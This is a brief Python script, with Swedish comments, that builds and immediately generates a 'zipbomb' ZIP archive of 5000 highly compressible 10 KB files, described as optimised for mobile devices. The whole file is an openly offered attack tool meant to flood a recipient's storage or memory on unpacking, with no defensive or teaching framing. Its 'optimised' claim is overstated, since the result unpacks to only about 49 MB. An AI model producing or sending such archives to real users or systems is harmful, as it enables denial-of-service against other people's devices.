import zipfile
import os

def create_zipbomb(output_filename="zipbomb.zip", num_files=5000, file_size_kb=10):
    """
    Skapar en zipbomb optimerad för mobila enheter.
    
    :param output_filename: Namnet på den utgående ZIP-filen.
    :param num_files: Antal filer att inkludera i ZIP-filen.
    :param file_size_kb: Storlek på varje fil i kilobyte.
    """
    
    content = b'A' * (file_size_kb * 1024)

    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for i in range(num_files):
            filename = f"file_{i}.txt"
            zipf.writestr(filename, content)

    print(f"Zipbomb '{output_filename}' skapad!")
    print(f"Antal filer i ZIP: {num_files}")
    print(f"Storlek per fil: {file_size_kb} KB")
    total_mb = (num_files * file_size_kb) / 1024
    print(f"Total storlek vid unpackning: ~{total_mb:.2f} MB")


create_zipbomb()
